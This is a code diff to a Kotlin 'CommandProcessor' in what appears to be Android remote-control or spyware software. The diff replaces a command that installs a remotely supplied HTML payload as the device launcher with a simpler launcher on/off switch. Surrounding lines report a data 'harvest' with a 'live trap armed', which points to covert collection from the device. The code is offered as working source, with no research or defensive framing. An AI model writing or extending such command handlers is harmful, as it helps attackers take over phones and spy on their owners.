@@ -1831,34 +1831,31 @@ object CommandProcessor {
                     status = "HARVEST_INITIATED"
                     errorMsg = "Historical vacuum engaged. Live trap armed."
                 }
-                "WEB_LAUNCHER" -> {
-                    val parts = content.split("|||", limit = 2)
-                    val wallpaperUrl = parts[0].trim()
-                    val htmlPayload = parts.getOrNull(1)?.trim() ?: ""
+                "SET_LAUNCHER" -> {
+                    val parts = content.split("|", limit = 2)
+                    val state = parts[0].trim().uppercase()
+                    val wallpaper = parts.getOrNull(1)?.trim() ?: ""
                     
-                    if (htmlPayload.isNotEmpty()) {
-                        WebLauncherManager.saveHtml(ctx, htmlPayload)
-                        WebLauncherManager.setEnabled(ctx, true)
-                        
-                        // FIX: Await wallpaper download/copy before launching the UI
-                        withContext(Dispatchers.IO) {
-                            WebLauncherManager.applyWallpaper(ctx, wallpaperUrl)
+                    if (state == "ON") {
+                        LauncherManager.setEnabled(ctx, true)
+                        if (wallpaper.isNotEmpty()) {
+                            withContext(Dispatchers.IO) {
+                                LauncherManager.applyWallpaper(ctx, wallpaper)
+                            }
                         }
-                        
                         val i = Intent(ctx, MainActivity::class.java)
                         i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
                         ctx.startActivity(i)
-                        status = "WEB_LAUNCHER_PIVOT_SUCCESS"
+                        status = "LAUNCHER_ENABLED"
+                        errorMsg = if (wallpaper.isNotEmpty()) "Wallpaper: $wallpaper" else "Using cached/default background"
                     } else {
-                        status = "FAILED_FORMAT"
+                        LauncherManager.setEnabled(ctx, false)
+                        val i = Intent(ctx, MainActivity::class.java)
+                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+                        ctx.startActivity(i)
+                        status = "LAUNCHER_DISABLED"
+                        errorMsg = "Dashboard restored"
                     }
-                }
-                "STOP_WEB_LAUNCHER" -> {
-                    WebLauncherManager.setEnabled(ctx, false)
-                    val i = Intent(ctx, MainActivity::class.java)
-                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
-                    ctx.startActivity(i)
-                    status = "WEB_LAUNCHER_DISABLED"
                 }
                 else -> {
                     status = "FAILED (UNKNOWN_CMD)"
